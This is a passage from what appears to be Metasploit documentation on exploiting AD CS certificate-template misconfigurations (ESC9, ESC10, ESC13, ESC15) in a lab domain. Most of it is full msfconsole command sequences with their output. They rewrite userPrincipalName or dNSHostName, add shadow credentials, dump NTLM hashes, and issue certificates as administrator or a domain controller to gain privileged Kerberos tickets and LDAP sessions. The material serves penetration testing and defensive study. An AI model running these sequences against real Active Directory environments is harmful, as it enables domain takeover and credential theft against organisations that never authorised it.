[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Current value of user2's userPrincipalName: Administrator
[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
[+] The operation completed successfully!
[*] Auxiliary module execution completed
</code></pre></div></div><p>We can then use the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module to gain a Kerberos ticket granting ticket (TGT) as the <code class="language-plaintext highlighter-rouge">Administrator</code> domain administrator. See the <a href="#getting-a-kerberos-ticket">Getting A Kerberos Ticket</a> section for more information.</p><h2 id="esc9-scenario-2"> <a href="#esc9-scenario-2" class="anchor-heading" aria-labelledby="esc9-scenario-2"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ESC9 Scenario 2</h2><p>Pre-requisites:</p><ul><li><code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> is set to <code class="language-plaintext highlighter-rouge">1</code> (if it’s set to <code class="language-plaintext highlighter-rouge">0</code> exploitation will still work but technically you’re exploiting ESC10 in that case)<li>A vulnerable certificate template has the <code class="language-plaintext highlighter-rouge">CT_FLAG_NO_SECURITY_EXTENSION</code> flag set.<li>The same vulnerable template has the <code class="language-plaintext highlighter-rouge">SubjectAltRequireDNS</code> flag set. &lt;— (Difference 1/2 between pre-requisites in scenario 1 and 2)<li>The same vulnerable template has a client authentication EKU<li>We have credentials of a machine account who has <code class="language-plaintext highlighter-rouge">GenericWrite</code> privileges over another <strong>machine account</strong> that can enroll in the vulnerable template &lt;— (Difference 2/2 between pre-requisites in scenario 1 and 2)<ul><li>Only machine accounts can have the <code class="language-plaintext highlighter-rouge">dNSHostName</code> attribute set, so our “target_user” needs to be machine account</ul></ul><p>The option <code class="language-plaintext highlighter-rouge">UPDATE_LDAP_OBJECT</code> will now be set to <code class="language-plaintext highlighter-rouge">dNSHostName</code> and because only machine accounts have the <code class="language-plaintext highlighter-rouge">dNSHostName</code> attribute we will set our <code class="language-plaintext highlighter-rouge">TARGET_USER</code> to the machine account<code class="language-plaintext highlighter-rouge">Test2$</code> We will be changing the <code class="language-plaintext highlighter-rouge">dNSHostName</code> of the machine account <code class="language-plaintext highlighter-rouge">Test1$</code> to <code class="language-plaintext highlighter-rouge">DC2.kerberos.issue</code> (<code class="language-plaintext highlighter-rouge">DC2</code> is the hostname of the domain controller) in hopes to impersonate the Domain Controller machine account</p><p><code class="language-plaintext highlighter-rouge">CERT_TEMPLATE</code> will be set to <code class="language-plaintext highlighter-rouge">ESC9-Template-Dns</code> which is the same template as <code class="language-plaintext highlighter-rouge">ESC9-Template</code> but with the <code class="language-plaintext highlighter-rouge">SubjectAltRequireDNS</code> flag set instead of the <code class="language-plaintext highlighter-rouge">SubjectAltRequireUPN</code> flag.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set rhosts 172.16.199.200
rhosts =&gt; 172.16.199.200
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldaprport 389
ldaprport =&gt; 389
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set target_username "Test2$"
target_username =&gt; Test2$
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set UPDATE_LDAP_OBJECT_VALUE dc2.kerberos.issue
UPDATE_LDAP_OBJECT_VALUE =&gt; dc2.kerberos.issue
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set UPDATE_LDAP_OBJECT dnsHostName
UPDATE_LDAP_OBJECT =&gt; dNSHostName
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set CA kerberos-DC2-CA
CA =&gt; kerberos-DC2-CA
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set CERT_TEMPLATE ESC9-Template-Dns
CERT_TEMPLATE =&gt; ESC9-Template-Dns
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapdomain kerberos.issue
ldapdomain =&gt; kerberos.issue
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldappassword N0tpassword!
ldappassword =&gt; N0tpassword!
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapusername Test1$
ldapusername =&gt; Test1$
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; run
[*] Reloading module...
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Running module against 172.16.199.200
[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Current value of Test2$'s dNSHostName:
[*] Attempting to update dNSHostName for CN=Test2,CN=Computers,DC=kerberos,DC=issue to dc2.kerberos.issue...
[+] Successfully updated CN=Test2,CN=Computers,DC=kerberos,DC=issue's dNSHostName to dc2.kerberos.issue
[+] The operation completed successfully!
[*] 172.16.199.200:445 - Adding shadow credentials for Test2$
[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Discovering base DN automatically
[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717141705_default_172.16.199.200_windows.ad.cs_907188.pfx
[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 517757a2-5174-5c43-6005-102c4429ff05
[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
[*] 172.16.199.200:445 - Getting hash for user2
[!] Warning: Provided principal and realm (Test2$@kerberos.issue) do not match entries in certificate:
[+] 172.16.199.200:88 - Received a valid TGT-Response
[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717141705_default_172.16.199.200_mit.kerberos.cca_132784.bin
[*] 172.16.199.200:88 - Getting NTLM hash for Test2$@kerberos.issue
[+] 172.16.199.200:88 - Received a valid TGS-Response
[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717141705_default_172.16.199.200_mit.kerberos.cca_364943.bin
[+] Found NTLM hash for Test2$: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
[+] 172.16.199.200:445 - The requested certificate was issued.
[*] 172.16.199.200:445 - Certificate Policies:
[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
[*] 172.16.199.200:445 - Certificate DNS: dc2.kerberos.issue
[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717141706_default_172.16.199.200_windows.ad.cs_369517.pfx
[*] 172.16.199.200:445 - reverting ldap object
[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Discovering base DN automatically
[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
[+] Deleted entry with device ID 517757a2-5174-5c43-6005-102c4429ff05
[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Attempting to delete attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue...
[+] Successfully deleted attribute dNSHostName from CN=Test2,CN=Computers,DC=kerberos,DC=issue
[+] The operation completed successfully!
[*] Auxiliary module execution completed
msf6 auxiliary(admin/kerberos/get_ticket) &gt; get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250717141706_default_172.16.199.200_windows.ad.cs_369517.pfx
[*] Running module against 172.16.199.200
[+] 172.16.199.200:88 - Received a valid TGT-Response
[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717142328_default_172.16.199.200_mit.kerberos.cca_370847.bin
[*] 172.16.199.200:88 - Getting NTLM hash for dc2$@kerberos.issue
[+] 172.16.199.200:88 - Received a valid TGS-Response
[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717142328_default_172.16.199.200_mit.kerberos.cca_596103.bin
[+] Found NTLM hash for dc2$: aad3b435b51404eeaad3b435b51404ee:cceede79c156a295f45e7ad38ee2f884
[*] Auxiliary module execution completed
</code></pre></div></div><h1 id="exploiting-esc10"> <a href="#exploiting-esc10" class="anchor-heading" aria-labelledby="exploiting-esc10"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC10</h1><h2 id="esc10-scenario-1"> <a href="#esc10-scenario-1" class="anchor-heading" aria-labelledby="esc10-scenario-1"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ESC10 Scenario 1</h2><p>Pre-requisites:</p><ul><li><code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> is set to <code class="language-plaintext highlighter-rouge">0</code><li>Because the above is set to <code class="language-plaintext highlighter-rouge">0</code> we don’t need the <code class="language-plaintext highlighter-rouge">CT_FLAG_NO_SECURITY_EXTENSION</code> flag set on the vulnerable template<li>Other than the above, pre-requisites and exploitation are the exact same as ESC9 Scenario 1</ul><h2 id="esc10-scenario-2"> <a href="#esc10-scenario-2" class="anchor-heading" aria-labelledby="esc10-scenario-2"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ESC10 Scenario 2</h2><p>Pre-requisites:</p><ul><li><code class="language-plaintext highlighter-rouge">CertificateMappingMethods</code> is set to <code class="language-plaintext highlighter-rouge">0x0004</code> (UPN certificate mapping) or <code class="language-plaintext highlighter-rouge">0x001F</code> (All of the above values)<li>The vulnerable template has the <code class="language-plaintext highlighter-rouge">SubjectAltRequireUPN</code> set<li>The same vulnerable template has a client authentication EKU<li>We have credentials of a machine account who has <code class="language-plaintext highlighter-rouge">GenericWrite</code> privileges over another machine account that can enroll in the vulnerable template</ul><p>In this scenario we can only compromise accounts that do not already have a populated <code class="language-plaintext highlighter-rouge">userPrincipalName</code> attribute, such as machine accounts and the default domain administrator. In addition, because this registry key only applies to SChannel authentication we are forced to authenticate to LDAPS once we get a certificate.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set rhosts 172.16.199.200
rhosts =&gt; 172.16.199.200
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldaprport 389
ldaprport =&gt; 389
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set target_username "user2"
target_username =&gt; user2
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set UPDATE_LDAP_OBJECT_VALUE 'DC2$@kerberos.issue'
UPDATE_LDAP_OBJECT_VALUE =&gt; DC2$@kerberos.issue
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set UPDATE_LDAP_OBJECT userPrincipalName
UPDATE_LDAP_OBJECT =&gt; userPrincipalName
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set CA kerberos-DC2-CA
CA =&gt; kerberos-DC2-CA
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set CERT_TEMPLATE ESC10-Template
CERT_TEMPLATE =&gt; ESC10-Template
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapdomain kerberos.issue
ldapdomain =&gt; kerberos.issue
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldappassword N0tpassword!
ldappassword =&gt; N0tpassword!
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapusername user1
ldapusername =&gt; user1
msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; run
[*] Running module against 172.16.199.200
[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Current value of user2's userPrincipalName: user2
[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to DC2$@kerberos.issue...
[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to DC2$@kerberos.issue
[+] The operation completed successfully!
[*] 172.16.199.200:445 - Adding shadow credentials for user2
[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Discovering base DN automatically
[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717143323_default_172.16.199.200_windows.ad.cs_860225.pfx
[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 825a1a2f-336f-e41c-24fb-703bb79f79f9
[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
[*] 172.16.199.200:445 - Getting hash for user2
[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
[+] 172.16.199.200:88 - Received a valid TGT-Response
[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717143323_default_172.16.199.200_mit.kerberos.cca_872380.bin
[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
[+] 172.16.199.200:88 - Received a valid TGS-Response
[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717143323_default_172.16.199.200_mit.kerberos.cca_123025.bin
[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
[+] 172.16.199.200:445 - The requested certificate was issued.
[*] 172.16.199.200:445 - Certificate Policies:
[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.1 (Server Authentication)
[*] 172.16.199.200:445 -   * 1.3.6.1.4.1.311.20.2.2 (Smart Card Logon)
[*] 172.16.199.200:445 - Certificate UPN: DC2$@kerberos.issue
[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717143324_default_172.16.199.200_windows.ad.cs_752634.pfx
[*] 172.16.199.200:445 - reverting ldap object
[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Discovering base DN automatically
[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
[+] Deleted entry with device ID 825a1a2f-336f-e41c-24fb-703bb79f79f9
[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
[*] Current value of user2's userPrincipalName: DC2$@kerberos.issue
[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
[+] The operation completed successfully!
[*] Auxiliary module execution completed

msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; use ldap_login
[*] Using auxiliary/scanner/ldap/ldap_login
[*] The CreateSession option within this module can open an interactive session

msf6 auxiliary(scanner/ldap/ldap_login) &gt; run ssl=true rhosts=172.16.199.200 LDAP::Auth=schannel LDAP::CertFile=/Users/jheysel/.msf4/loot/20250717143324_default_172.16.199.200_windows.ad.cs_752634.pfx
[+] Success: 'Cert File /Users/jheysel/.msf4/loot/20250717143324_default_172.16.199.200_windows.ad.cs_752634.pfx'
[*] LDAP session 1 opened (172.16.199.1:58674 -&gt; 172.16.199.200:389) at 2025-07-17 14:35:08 -0700
[*] Scanned 1 of 1 hosts (100% complete)
[*] Bruteforce completed, 1 credential was successful.
[*] 1 LDAP session was opened successfully.
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ldap/ldap_login) &gt; sessions -l

Active sessions
===============

  Id  Name  Type  Information                     Connection
  --  ----  ----  -----------                     ----------
  1         ldap  LDAP DC2$ @ 172.16.199.200:389  172.16.199.1:58674 -&gt; 172.16.199.200:389 (172.16.199.200)

</code></pre></div></div><h1 id="exploiting-esc13"> <a href="#exploiting-esc13" class="anchor-heading" aria-labelledby="exploiting-esc13"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC13</h1><p>To exploit ESC13, we need to target a certificate that has an issuance policy linked to a universal group in Active Directory. Unlike some of the other ESC techniques, successfully exploiting ESC13 isn’t necessarily guaranteed to yield administrative privileges, rather the privileges that are gained are those of the group which is linked to by OID in the certificate template’s issuance policy. The <code class="language-plaintext highlighter-rouge">auxiliary/gather/ldap_esc_vulnerable_cert_finder</code> module is capable of identifying certificates that meet the necessary criteria. When one is found, the module will include the group whose permissions will be included in the resulting Kerberos ticket in the notes section. In the following example, the ESC13-Test template is vulnerable to ESC13 and will yield a ticket including the ESC13-Group permissions.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) &gt; run
...
[+] Template: ESC13-Test
[*]   Distinguished Name: CN=ESC13-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=collalabs1,DC=local
[*]   Manager Approval: Disabled
[*]   Required Signatures: 0
[+]   Vulnerable to: ESC13
[*]   Notes: ESC13 groups: ESC13-Group
[*]   Certificate Template Enrollment SIDs:
[*]     * S-1-5-21-3474343397-3755413101-2031708755-512 (Domain Admins)
[*]     * S-1-5-21-3474343397-3755413101-2031708755-513 (Domain Users)
[*]     * S-1-5-21-3474343397-3755413101-2031708755-519 (Enterprise Admins)
[+]   Issuing CA: collalabs1-SRV-ADDS01-CA (SRV-ADDS01.collalabs1.local)
[*]     Enrollment SIDs:
[*]       * S-1-5-11 (Authenticated Users)
[*]       * S-1-5-21-3474343397-3755413101-2031708755-519 (Enterprise Admins)
[*]       * S-1-5-21-3474343397-3755413101-2031708755-512 (Domain Admins)
</code></pre></div></div><p>In this case, the ticket can be issued with the <code class="language-plaintext highlighter-rouge">icpr_cert</code> module. No additional options are required to issue the certificate beyond the standard <code class="language-plaintext highlighter-rouge">CA</code>, <code class="language-plaintext highlighter-rouge">CERT_TEMPLATE</code>, target and authentication options.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf &gt; use auxiliary/admin/dcerpc/icpr_cert 
msf auxiliary(admin/dcerpc/icpr_cert) &gt; set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
msf auxiliary(admin/dcerpc/icpr_cert) &gt; set SMBUser normaluser
SMBUser =&gt; normaluser
msf auxiliary(admin/dcerpc/icpr_cert) &gt; set SMBDomain COLLALABS1
SMBDomain =&gt; COLLALABS1
msf auxiliary(admin/dcerpc/icpr_cert) &gt; set SMBPass normalpass
SMBPass =&gt; normalpass
msf auxiliary(admin/dcerpc/icpr_cert) &gt; set CA collalabs1-SRV-ADDS01-CA
CA =&gt; collalabs1-SRV-ADDS01-CA
msf auxiliary(admin/dcerpc/icpr_cert) &gt; set CERT_TEMPLATE ESC13-Test
CERT_TEMPLATE =&gt; ESC13-Test
msf auxiliary(admin/dcerpc/icpr_cert) &gt; run
[*] Running module against 172.30.239.85

[+] 172.30.239.85:445 - The requested certificate was issued.
[*] 172.30.239.85:445 - Certificate Email: normaluser@collalabs1.local
[*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3474343397-3755413101-2031708755-10051
[*] 172.30.239.85:445 - Certificate UPN: normaluser@collalabs1.local
[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20240226170310_default_172.30.239.85_windows.ad.cs_917878.pfx
[*] Auxiliary module execution completed
msf auxiliary(admin/dcerpc/icpr_cert) &gt;
</code></pre></div></div><p>We can then use the <code class="language-plaintext highlighter-rouge">kerberos/get_ticket</code> module to gain a Kerberos ticket granting ticket (TGT) with the <code class="language-plaintext highlighter-rouge">ESC13-Group</code> RID present in the Groups field of the TGT PAC.</p><h1 id="exploiting-esc15"> <a href="#exploiting-esc15" class="anchor-heading" aria-labelledby="exploiting-esc15"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Exploiting ESC15</h1><p>Steps for exploiting ESC15 are similar to ESC1 whereby a privileged user such as a domain admin is specified in the <code class="language-plaintext highlighter-rouge">ALT_UPN</code>. In addition to targeting another user, the certificate has additional Application Policy OIDs added to it which adjusts the context in which the issued certificate can be used. These policy OIDs are accepted by the issuing CA if the target certificate template is defined using schema version 1.</p><p>In the following example, the Client Authentication OID (1.3.6.1.5.5.7.3.2) is added which enables the certificate to be used for authentication to LDAP via SCHANNEL. The operator can then perform LDAP queries with the privileges of the user specified in the alternate UPN.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser normaluser
SMBUser =&gt; normaluser
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBDomain COLLALABS1
SMBDomain =&gt; COLLALABS1
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass normalpass
SMBPass =&gt; normalpass
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA collalabs1-SRV-ADDS01-CA
CA =&gt; collalabs1-SRV-ADDS01-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC15-Test
CERT_TEMPLATE =&gt; ESC15-Test
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ADD_CERT_APP_POLICY 1.3.6.1.5.5.7.3.2
ADD_CERT_APP_POLICY =&gt; 1.3.6.1.5.5.7.3.2
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ALT_UPN administrator@collalabs1.local
ALT_UPN =&gt; administrator@collalabs1.local
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
ALT_SID =&gt; S-1-5-21-3402587289-1488798532-3618296993-1000
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate Policies:
<span class="zs">[*]</span> 172.30.239.85:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009171337_default_172.30.239.85_windows.ad.cs_089081.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>Certificates issued using this technique are not directly able to be used for Kerberos authentication via PKINIT. However, the attack can be modified by adding the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) to issue a certificate that can issue additional certificates in a manner similar to ESC2 which are compatible with PKINIT.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 172.30.239.85
RHOSTS =&gt; 172.30.239.85
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser normaluser
SMBUser =&gt; normaluser
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBDomain COLLALABS1
SMBDomain =&gt; COLLALABS1
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass normalpass
SMBPass =&gt; normalpass
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA collalabs1-SRV-ADDS01-CA
CA =&gt; collalabs1-SRV-ADDS01-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC15-Test
CERT_TEMPLATE =&gt; ESC15-Test
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ADD_CERT_APP_POLICY 1.3.6.1.4.1.311.20.2.1
ADD_CERT_APP_POLICY =&gt; 1.3.6.1.4.1.311.20.2.1
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 172.30.239.85

<span class="zs">[*]</span> 172.30.239.85:445 - Requesting a certificate...
<span class="zg">[+]</span> 172.30.239.85:445 - The requested certificate was issued.
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate Policies:
<span class="zs">[*]</span> 172.30.239.85:445 -   * 1.3.6.1.4.1.311.20.2.1 (Certificate Request Agent)
<span class="zs">[*]</span> 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><p>Next, the certificate is used in conjunction with the <code class="language-plaintext highlighter-rouge">PFX</code> and <code class="language-plaintext highlighter-rouge">ON_BEHALF_OF</code> options to issue a certificate compatible with Kerberos as the privileged user (previously <code class="language-plaintext highlighter-rouge">ALT_UPN</code>).</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf auxiliary(admin/dcerpc/icpr_cert) &gt; unset ADD_CERT_APP_POLICY 
Unsetting ADD_CERT_APP_POLICY...
msf auxiliary(admin/dcerpc/icpr_cert) &gt; unset ALT_UPN 
Unsetting ALT_UPN...
msf auxiliary(admin/dcerpc/icpr_cert) &gt; set CERT_TEMPLATE User
CERT_TEMPLATE =&gt; User
msf auxiliary(admin/dcerpc/icpr_cert) &gt; set ON_BEHALF_OF COLLALABS1\\administrator
ON_BEHALF_OF =&gt; COLLALABS1\\administrator
msf auxiliary(admin/dcerpc/icpr_cert) &gt; set PFX /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
PFX =&gt; /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
msf auxiliary(admin/dcerpc/icpr_cert) &gt; run
[*] Running module against 172.30.239.85

[*] 172.30.239.85:445 - Requesting a certificate...
[+] 172.30.239.85:445 - The requested certificate was issued.
[*] 172.30.239.85:445 - Certificate Email: administrator@collalabs1.local
[*] 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172817_default_172.30.239.85_windows.ad.cs_427087.pfx
[*] Auxiliary module execution completed
msf auxiliary(admin/dcerpc/icpr_cert) &gt;
